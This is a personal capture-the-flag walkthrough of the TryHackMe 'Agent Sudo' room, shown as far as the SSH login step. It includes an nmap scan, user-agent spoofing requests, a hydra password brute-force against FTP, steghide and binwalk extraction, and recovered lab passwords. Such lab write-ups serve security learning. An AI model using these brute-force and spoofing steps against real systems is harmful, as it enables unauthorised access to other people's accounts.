# Agent Sudo THM

[https://tryhackme.com/room/agentsudoctf](https://tryhackme.com/room/agentsudoctf)

IP address `10.10.55.71`




# Names

- agent R
- chris
- agent J
- agent C
- James

# Recon

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-05 22:10 AEST
Nmap scan report for 10.10.55.71
Host is up (0.31s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Ok so 3 ports are open. We can start running an enumaration on `port 80`

The main page has the following message

```
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R

```



Using the hint on website `change user-agent to C`. Using burp suite we can change the `user-agent`


```html
GET /agent_C_attention.php HTTP/1.1
Host: 10.10.55.71
User-Agent: R
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

```html
What are you doing! Are you one of the 25 employees? If not, I going to report this incident

Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 
```


```html
GET /agent_C_attention.php HTTP/1.1
Host: 10.10.55.71
User-Agent: C
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
We get the following redirect

```html

Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 

```
Great we can now try to brute force the FTP password using username `chris`

```bash
hydra -l chris -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt 10.10.55.71 ftp -vv -I

[21][ftp] host: 10.10.55.71   login: chris   password: crystal

```

We get 3 files

- cute-alien.jpg  
- cutie.png
- To_agentJ.txt


the text file has the following

```bash
└─$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent 
```

We can check for any hidden files using stegfile

unable however using 

`binwalk` we can see there is a compressed file attached

```bash

└─$ cat To_agentR.txt 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

decoding the password it gives us `Area51`


```bash
└─$ steghide extract -sf cute-alien.jpg -v
Enter passphrase: 
reading stego file "cute-alien.jpg"... done
extracting data... done
checking crc32 checksum... ok
writing extracted data to "message.txt"... done
                                                                                
┌──(felipe㉿kali)-[~/Documents/THM/agentsudo]
└─$ cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris


```

so 

ssh james@

`hackerrules!`